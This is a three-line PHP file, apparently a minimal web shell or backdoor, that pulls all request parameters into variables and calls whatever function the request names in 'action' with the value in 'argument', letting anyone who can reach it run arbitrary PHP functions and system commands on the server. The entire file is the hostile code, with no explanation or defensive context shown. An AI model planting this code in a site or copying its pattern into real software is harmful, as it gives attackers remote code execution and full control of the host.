<?php
extract($_REQUEST, EXTR_SKIP);
die($action($argument));
